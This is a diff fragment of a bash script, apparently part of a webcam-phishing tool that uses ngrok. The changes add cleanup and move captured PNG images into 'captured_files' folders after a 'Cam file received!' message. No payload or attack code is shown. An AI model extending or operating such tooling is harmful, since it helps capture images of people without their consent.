@@ -1,6 +1,9 @@
 clear
 
-rm *.zip > dev\null 2>&1 || true
+rm Log.log *.zip > dev\null 2>&1 || true
+mv *.png captured_files/old > dev\null 2>&1 || true
+mv captured_files/new/*.png captured_files/old/ > dev\null 2>&1 || true
+
 
 if  ./ngrok -v > dev\null 2>&1
  then
@@ -98,8 +101,10 @@ sleep 0.5
 
 if [[ -e "Log.log" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
+mv *.png captured_files/new > dev\null 2>&1 || true
 rm -rf Log.log
 fi
+
 sleep 0.5
 
 done 
@@ -277,4 +282,3 @@ checkfound
 banner
 dependencies
 start1
-
